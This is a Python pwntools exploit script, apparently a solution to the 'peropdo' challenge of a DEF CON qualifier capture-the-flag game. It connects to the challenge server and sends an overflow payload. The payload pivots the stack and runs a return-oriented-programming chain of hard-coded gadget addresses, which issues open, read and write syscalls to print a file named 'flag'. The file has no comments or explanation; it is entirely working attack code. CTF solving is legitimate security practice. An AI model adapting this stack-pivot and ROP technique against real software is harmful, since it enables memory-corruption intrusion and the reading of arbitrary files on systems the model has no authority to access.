from pwn import *


bss1 = 0x080ED260 - 0x1cc        #non_zero
bss2 = 0x080EC6C0 - 0x1cc
name = 0x080ECFC0
xchgeax = 0x0804b45c
popeax = 0x080E77A4
popebx = 0x08058E28
popecx = 0x080e5ee1
popedx = 0x0806f2fa
filename = 0x080ECFC0 + 4
int80 = 0x0806FAE0
inceax = 0x0807BF06

#s = process("/root/peropdo")
s = remote("peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me",80)

espdata = p32(0x08054b80) + p32(popeax) + p32(5)
espdata += p32(popebx) + p32(filename) + p32(popecx) + p32(0) + p32(popedx) +p32(0)
espdata += p32(int80) + p32(popeax) + p32(3)
espdata += p32(popebx) + p32(3) + p32(popecx) + p32(filename) + p32(popedx) +p32(0x100)
espdata += p32(int80) + p32(popeax) + p32(4)
espdata += p32(popebx) + p32(1) + p32(popecx) + p32(filename) + p32(popedx) +p32(0x100)
espdata += p32(int80)
print s.recvline()
print len(espdata)

payload =  p32(0x08054b80) + 'flag\x00\x00\x00\x00'+ 'a'*200 + espdata.ljust(460,'b') + p32(xchgeax) + 'a'*304 + p32(bss1)+ p32(bss2)
payload += 'a'*88 + p32(name - 0x1cc) 
payload = payload.ljust(0x1000,'c')
s.sendline(payload)

print s.recv(1024)
raw_input("123")